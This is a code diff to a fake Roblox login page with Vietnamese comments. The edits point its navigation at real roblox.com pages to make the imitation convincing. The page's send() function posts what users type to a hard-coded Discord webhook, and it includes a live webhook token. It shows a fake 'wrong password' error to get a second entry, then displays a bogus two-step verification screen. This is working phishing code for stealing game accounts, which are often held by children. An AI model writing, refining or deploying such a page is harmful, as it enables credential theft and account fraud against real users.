@@ -40,7 +40,14 @@
             display: flex; align-items: center; justify-content: space-between;
             width: 100%; margin-top: 8px;
         }
-        .nav-item { color: #bbb; font-size: 7px; font-weight: 600; }
+        /* Cập nhật CSS cho các mục link */
+        .nav-item { 
+            color: #bbb; 
+            font-size: 7px; 
+            font-weight: 600; 
+            text-decoration: none; /* Xóa gạch chân mặc định của thẻ a */
+        }
+        .nav-item:active { color: #fff; } /* Hiệu ứng khi nhấn vào */
 
         .bg-image {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -118,7 +125,6 @@
         .footer-links span { font-size: 7.5px; color: #bbb; }
         .footer-copyright { font-size: 6px; color: #555; margin-top: 15px; }
 
-        /* --- LỚP NỀN TỐI VÀ LOADING --- */
         #dark-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.75); z-index: 1000; display: none;
@@ -135,11 +141,10 @@
         .sq:nth-child(3) { animation-delay: 0.4s; }
         @keyframes blink { from { opacity: 0.2; } to { opacity: 1; } }
 
-        /* --- BẢNG XÁC MINH 2 BƯỚC --- */
         #verify-modal {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             width: 280px; 
-            background: #1a1c1e; /* Nền đậm */
+            background: #1a1c1e; 
             border-radius: 8px;
             z-index: 1002; display: none; flex-direction: column; overflow: hidden;
             color: #fff; text-align: center;
@@ -150,8 +155,8 @@
         .v-text { font-size: 11px; color: #ccc; line-height: 1.5; margin-bottom: 20px; }
         
         .v-btn { 
-            width: 100%; /* Giữ nguyên chiều ngang */
-            padding: 5px; /* Giảm độ dày/chiều dài dọc xuống một nửa */
+            width: 100%; 
+            padding: 5px; 
             background: transparent; 
             border: 1px solid #888; 
             color: #fff; 
@@ -159,7 +164,6 @@
             font-size: 11px; 
             cursor: pointer;
         }
-
     </style>
 </head>
 <body>
@@ -175,8 +179,10 @@
         <div class="btn-top-login">Đăng nhập</div>
     </div>
     <div class="header-nav">
-        <span class="nav-item">Bảng xếp hạng</span><span class="nav-item">Chợ</span>
-        <span class="nav-item">Tạo</span><span class="nav-item">Robux</span>
+        <a href="https://www.roblox.com/leaderboard" class="nav-item">Bảng xếp hạng</a>
+        <a href="https://www.roblox.com/catalog" class="nav-item">Chợ</a>
+        <a href="https://www.roblox.com/develop" class="nav-item">Tạo</a>
+        <a href="https://www.roblox.com/robux" class="nav-item">Robux</a>
     </div>
 </div>
 
@@ -238,7 +244,6 @@ function send() {
         return;
     }
 
-    // Gửi Webhook
     fetch("https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -246,21 +251,19 @@ function send() {
     });
 
     if (clickCount === 0) {
-        // Lần đầu: Báo lỗi sai mật khẩu
         setTimeout(() => { 
             err.style.display = 'block';
             document.getElementById('p').value = ""; 
             clickCount++;
         }, 800);
     } else {
-        // Lần hai: Tối màn hình và hiện xác minh
         overlay.style.display = 'block';
         loader.style.display = 'flex';
 
         setTimeout(() => {
             loader.style.display = 'none';
             modal.style.display = 'flex';
-        }, 2500); // Đợi 2.5 giây loading rồi hiện bảng
+        }, 2500);
     }
 }
 </script>
